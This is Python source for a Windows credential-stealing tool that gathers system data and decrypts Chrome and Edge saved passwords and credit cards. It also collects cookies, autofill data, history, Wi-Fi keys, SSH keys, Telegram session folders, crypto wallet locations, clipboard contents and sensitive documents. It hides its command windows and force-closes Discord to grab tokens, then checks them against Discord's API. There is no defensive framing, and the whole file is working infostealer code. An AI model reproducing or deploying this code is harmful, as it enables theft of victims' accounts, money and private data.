import os
import platform
import socket
import psutil
import subprocess
import re
import json
import base64
import sqlite3
import shutil
from datetime import datetime
import time
import requests

# --- Import optional libraries with fallbacks ---
try:
    import win32crypt; import win32cred
except ImportError: pass
try:
    import browser_cookie3
except ImportError: pass
try:
    from Crypto.Cipher import AES
except ImportError: pass
try:
    import pyperclip
except ImportError: pass

# ==================================================================================================
# UTILITY FUNCTIONS
# ==================================================================================================
def run_command(command):
    try:
        startupinfo = subprocess.STARTUPINFO(); startupinfo.wShowWindow = subprocess.SW_HIDE
        result = subprocess.check_output(command, startupinfo=startupinfo, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return result.decode('utf-8', errors='ignore').strip()
    except Exception: return ""

# ==================================================================================================
# DECOUPLED HARVESTING FUNCTIONS (ONE PER DATA POINT)
# ==================================================================================================

# --- System & Hardware ---
def harvest_os_info():
    uname = platform.uname()
    return f"OS Version: {uname.system} {uname.release} ({platform.version()})\nOS Build: {platform.win32_ver()[1]}"
def harvest_architecture(): return f"System Architecture: {platform.machine()}"
def harvest_hostname(): return f"Hostname: {socket.gethostname()}"
def harvest_users():
    current_user = f"Current User: {os.getlogin()}"
    all_users_cmd = run_command("wmic useraccount get name")
    user_list = [line.strip() for line in all_users_cmd.splitlines() if line.strip() and line.strip().lower() != "name"]
    all_users = f"All Users on System:\n  " + "\n  ".join(user_list)
    return f"{current_user}\n{all_users}"
def harvest_uptime(): return f"System Uptime: {str(datetime.fromtimestamp(psutil.boot_time()))}"
def harvest_hardware():
    cpu = f"CPU: {platform.processor()}"; ram = f"RAM: {psutil.virtual_memory().total / (1024**3):.2f} GB"
    gpu = "GPU(s):\n  " + "\n  ".join(re.findall(r"Name\s+(.+)", run_command("wmic path win32_VideoController get name")))
    disks = "Disks:\n"
    for part in psutil.disk_partitions():
        try: disks += f"  - {part.device} ({part.fstype}) {psutil.disk_usage(part.mountpoint).total / (1024**3):.2f}GB\n"
        except Exception: pass
    return f"{cpu}\n{ram}\n{gpu}\n{disks}"
def harvest_security_products():
    av = "Antivirus:\n  " + "\n  ".join(run_command('wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname').split('\n')[1:])
    fw = "Firewall:\n  " + "\n  ".join(run_command('wmic /namespace:\\\\root\\securitycenter2 path firewallproduct get displayname').split('\n')[1:])
    return f"{av.strip()}\n{fw.strip()}"
def harvest_environment_variables(): return "Environment Variables:\n" + "\n".join([f"{key}={value}" for key, value in os.environ.items()])

# --- Apps & Processes ---
def harvest_installed_apps(): return "Installed Applications:\n" + run_command(['wmic', 'product', 'get', 'name'])
def harvest_running_processes():
    procs = "Running Processes:\n"
    for p in psutil.process_iter(['pid', 'name']):
        try: procs += f"PID: {p.info['pid']}, Name: {p.info['name']}\n"
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess): pass
    return procs

# --- Network & WiFi ---
def harvest_ip_addresses():
    public_ip = run_command(['curl', '-s', 'ifconfig.me']); hostname = socket.gethostname()
    private_ipv4 = socket.gethostbyname(hostname)
    return f"Private IPv4: {private_ipv4}\nPublic IP Address: {public_ip}"
def harvest_mac_address():
    mac_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", run_command(['getmac']))
    return f"MAC Address: {mac_match.group(0) if mac_match else 'N/A'}"
def harvest_wifi_passwords():
    output = ""
    try:
        profiles_data = run_command(['netsh', 'wlan', 'show', 'profiles']).split('\n')
        profiles = [line.split(':')[1].strip() for line in profiles_data if "All User Profile" in line]
        for profile in profiles:
            try:
                profile_info = run_command(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).split('\n')
                password = [line.split(':')[1].strip() for line in profile_info if "Key Content" in line]
                output += f"Profile: {profile}\n  Password: {password[0] if password else 'N/A'}\n"
            except Exception: pass
    except Exception: return "Could not retrieve Wi-Fi passwords."
    return output if output else "No saved Wi-Fi profiles found."
def harvest_network_connections():
    conns = "Active Network Connections:\n"
    try:
        for c in psutil.net_connections():
            if c.status == 'ESTABLISHED': conns += f"  - Laddr: {c.laddr.ip}:{c.laddr.port} | Raddr: {c.raddr.ip}:{c.raddr.port} | PID: {c.pid}\n"
    except Exception: pass
    return conns
def harvest_arp_table(): return "ARP Table:\n" + run_command(['arp', '-a'])
def harvest_dns_cache(): return "DNS Cache:\n" + run_command(['ipconfig', '/displaydns'])

# --- Credentials & Sessions ---
def get_chromium_encryption_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State");
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f: local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    except Exception: return None
def decrypt_chromium_data(data, key):
    try:
        iv = data[3:15]; payload = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception: return ""
def harvest_browser_passwords():
    output = ""; browser_paths = {'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'), 'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')}
    for browser_name, path in browser_paths.items():
        if not os.path.exists(path): continue
        key = get_chromium_encryption_key(path)
        if not key: continue
        db_path = os.path.join(path, "Default", "Login Data")
        if not os.path.exists(db_path): continue
        temp_db = os.path.join(os.getenv("TEMP"), "temp_pw.db"); shutil.copy(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            browser_output = ""
            for url, user, pass_blob in cursor.fetchall():
                password = decrypt_chromium_data(pass_blob, key)
                if password: browser_output += f"URL: {url}\n  User: {user}\n  Pass: {password}\n" + "-"*20 + "\n"
            if browser_output: output += f"*** {browser_name} ***\n{browser_output}"
        except Exception: pass
        finally: conn.close(); os.remove(temp_db)
    return output if output else "No browser passwords found."
def harvest_browser_cookies():
    output = ""
    try:
        browsers = [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge, browser_cookie3.brave, browser_cookie3.opera]
        for browser_func in browsers:
            browser_output = ""
            try:
                cj = browser_func(domain_name='')
                for cookie in cj:
                    roblox_flag = " [*** ROBLOX SECURITY COOKIE ***]" if cookie.name.lower() == '.roblosecurity' else ""
                    browser_output += f"Host: {cookie.domain}{roblox_flag}\n  Name: {cookie.name}\n  Value: {cookie.value}\n" + "-"*20 + "\n"
                if browser_output: output += f"*** {browser_func.__name__.title()} ***\n{browser_output}"
            except Exception: continue
    except NameError: return "[!] Browser harvesting failed: 'browser-cookie3' is not installed."
    return output if output else "No browser cookies were found."
def harvest_browser_autofill():
    output = ""; browser_paths = {'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'), 'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')}
    for browser_name, path in browser_paths.items():
        if not os.path.exists(path): continue
        db_path = os.path.join(path, "Default", "Web Data")
        if not os.path.exists(db_path): continue
        temp_db = os.path.join(os.getenv("TEMP"), "temp_af.db"); shutil.copy(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT name, value FROM autofill")
            browser_autofill = ""
            for name, value in cursor.fetchall(): browser_autofill += f"Name: {name}\nValue: {value}\n" + "-"*20 + "\n"
            if browser_autofill: output += f"*** {browser_name} ***\n{browser_autofill}"
        except Exception: pass
        finally: conn.close(); os.remove(temp_db)
    return output if output else "No autofill data found."
def harvest_browser_history():
    output = ""; browser_paths = {'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'), 'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')}
    for browser_name, path in browser_paths.items():
        if not os.path.exists(path): continue
        db_path = os.path.join(path, "Default", "History")
        if not os.path.exists(db_path): continue
        temp_db = os.path.join(os.getenv("TEMP"), "temp_hs.db"); shutil.copy(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 200")
            browser_history = ""
            for url, title, visit_count in cursor.fetchall(): browser_history += f"URL: {url}\n  Title: {title}\n  Visits: {visit_count}\n" + "-"*20 + "\n"
            if browser_history: output += f"*** {browser_name} ***\n{browser_history}"
        except Exception: pass
        finally: conn.close(); os.remove(temp_db)
    return output if output else "No browser history found."
def harvest_credit_cards():
    output = ""; browser_paths = {'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'), 'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')}
    for browser_name, path in browser_paths.items():
        if not os.path.exists(path): continue
        key = get_chromium_encryption_key(path)
        if not key: continue
        db_path = os.path.join(path, "Default", "Web Data")
        if not os.path.exists(db_path): continue
        temp_db = os.path.join(os.getenv("TEMP"), "temp_cc.db"); shutil.copy(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            browser_output = ""
            for name, exp_m, exp_y, card_blob in cursor.fetchall():
                card_num = decrypt_chromium_data(card_blob, key)
                if card_num: browser_output += f"Name: {name}\n  Expires: {exp_m}/{exp_y}\n  Card: {card_num}\n" + "-"*20 + "\n"
            if browser_output: output += f"*** {browser_name} ***\n{browser_output}"
        except Exception: pass
        finally: conn.close(); os.remove(temp_db)
    return output if output else "No credit cards found."

# --- NEW: Definitive Discord Token Harvester ---
def validate_token(token):
    try:
        headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'}
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
        return response.status_code == 200
    except Exception:
        return False

def harvest_discord_tokens():
    output = ""
    # More aggressive process killing
    run_command("taskkill /F /IM discord.exe")
    time.sleep(2)
            
    roaming, local = os.getenv('APPDATA'), os.getenv('LOCALAPPDATA')
    paths = {
        'Discord': os.path.join(roaming, 'discord'),
        'Discord Canary': os.path.join(roaming, 'discordcanary'),
        'Discord PTB': os.path.join(roaming, 'discordptb'),
        'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
        'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default'),
        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
    }
    
    found_tokens = set()
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        
        # This is the full path to the token database directory
        token_db_path = os.path.join(path, 'Local Storage', 'leveldb')
        if not os.path.exists(token_db_path): continue

        # This is the temporary path where we will copy the files
        temp_copy_path = os.path.join(os.getenv("TEMP"), f"temp_ldb_{platform}")

        try:
            # Copy the entire leveldb directory to our temp location
            shutil.copytree(token_db_path, temp_copy_path, dirs_exist_ok=True)
            
            # Now, scan the copied files, which are not locked
            for file_name in os.listdir(temp_copy_path):
                if not file_name.endswith(('.log', '.ldb')): continue
                try:
                    with open(os.path.join(temp_copy_path, file_name), 'r', errors='ignore') as f:
                        for line in f:
                            # Improved regex for better matching
                            for token in re.findall(r'mfa\.[\w-]{84}|[\w-]{24,26}\.[\w-]{6}\.[\w-]{38}', line.strip()):
                                if token not in found_tokens:
                                    if validate_token(token):
                                        output += f"[+] VALID TOKEN FOUND in {platform}:\n{token}\n\n"
                                    found_tokens.add(token)
                except Exception: pass
        except Exception:
            pass # Failed to copy directory
        finally:
            # Clean up the temporary directory
            if os.path.exists(temp_copy_path):
                shutil.rmtree(temp_copy_path)
    
    return output if output else "No valid Discord tokens found."

def harvest_app_credentials():
    output = ""
    filezilla_path = os.path.join(os.environ['APPDATA'], 'FileZilla', 'recentservers.xml')
    if os.path.exists(filezilla_path):
        with open(filezilla_path, 'r', errors='ignore') as f: output += "FileZilla Recent Servers:\n" + f.read() + "\n\n"
    pidgin_path = os.path.join(os.environ['APPDATA'], '.purple', 'accounts.xml')
    if os.path.exists(pidgin_path):
        with open(pidgin_path, 'r', errors='ignore') as f:
            pidgin_data = f.read()
            found_creds = re.findall(r'<name>(.*?)</name>.*?<password>(.*?)</password>', pidgin_data)
            if found_creds:
                output += "Pidgin Messenger Credentials:\n"
                for user, password in found_creds: output += f"  Username: {user}\n  Password: {password}\n"
    return output if output else "No supported application credentials found."
def harvest_ssh_keys():
    ssh_path = os.path.join(os.environ['USERPROFILE'], '.ssh')
    output = ""
    if os.path.exists(ssh_path):
        for item in os.listdir(ssh_path):
            try:
                with open(os.path.join(ssh_path, item), 'r') as f: output += f"*** Found Key: {item} ***\n{f.read()}\n"
            except Exception: pass
    return output if output else "No SSH keys found."
def harvest_telegram_session():
    tdata_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
    if not os.path.exists(tdata_path): return "Telegram session folder not found."
    try:
        zip_path = os.path.join(os.getenv("TEMP"), f"telegram_session_{socket.gethostname()}"); shutil.make_archive(zip_path, 'zip', tdata_path)
        return f"SUCCESS: Telegram session folder found and zipped.\nArchive created at: {zip_path}.zip"
    except Exception as e: return f"FAIL: Found Telegram folder, but failed to zip it. Error: {e}"
def harvest_crypto_wallets():
    output = ""; wallet_paths = {'MetaMask': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn'), 'Exodus': os.path.join(os.getenv('APPDATA'), 'Exodus')}
    output += "*** Browser & App Wallets ***\n"
    for name, path in wallet_paths.items():
        if os.path.exists(path): output += f"[+] Found {name} wallet data folder at: {path}\n"
    output += "\n*** File-based Wallets ***\n"
    wallets = find_files(r'wallet.*\.dat')
    if wallets: output += "Found Cryptocurrency Wallets:\n" + "\n".join(wallets) + "\n"
    return output
def harvest_sensitive_documents():
    docs = find_files(r'.*(invoice|tax|receipt|password|seed|phrase).*\.(pdf|docx|txt|xls)')
    return "Found Potentially Sensitive Documents:\n" + "\n".join(docs) if docs else "No sensitive documents found."
def harvest_clipboard(): return "Clipboard Contents:\n" + pyperclip.paste()
def find_files(pattern):
    results = []
    for root, _, files in os.walk(os.environ['USERPROFILE']):
        if any(x in root.lower() for x in ['appdata', 'program files', 'windows']): continue
        for f in files:
            if re.match(pattern, f, re.IGNORECASE):
                try: results.append(os.path.join(root, f))
                except Exception: pass
    return results

# ==================================================================================================
# MAIN HARVEST FUNCTION (FINAL GRANULAR VERSION)
# ==================================================================================================
def harvest_all_data():
    report_map = {
        # This dictionary defines the tabs that will appear in the GUI.
        "OS Info": harvest_os_info, "Sys Arch": harvest_architecture, "Hostname": harvest_hostname,
        "Users": harvest_users, "Uptime": harvest_uptime, "Hardware": harvest_hardware,
        "Security": harvest_security_products, "Env Vars": harvest_environment_variables,
        "Apps": harvest_installed_apps, "Processes": harvest_running_processes,
        "IP Addr": harvest_ip_addresses, "MAC Addr": harvest_mac_address,
        "WiFi": harvest_wifi_passwords, "Connections": harvest_network_connections,
        "ARP Table": harvest_arp_table, "DNS Cache": harvest_dns_cache,
        "App Creds": harvest_app_credentials, "Discord": harvest_discord_tokens,
        "SSH Keys": harvest_ssh_keys, "Telegram": harvest_telegram_session,
        "Clipboard": harvest_clipboard, "Credit Cards": harvest_credit_cards, "Crypto": harvest_crypto_wallets,
        "Documents": harvest_sensitive_documents, "Passwords": harvest_browser_passwords,
        "Cookies": harvest_browser_cookies, "Autofill": harvest_browser_autofill,
        "History": harvest_browser_history,
    }

    final_report = ""
    for category_name, harvest_function in report_map.items():
        # This is the ONLY place that writes the '---' header. This fixes the bug.
        final_report += f"--- {category_name.upper()} ---\n\n"
        try:
            result = harvest_function()
            final_report += str(result).strip() + "\n\n"
        except Exception as e:
            final_report += f"  [!] Error during '{category_name}': {e}\n\n"
    
    return final_report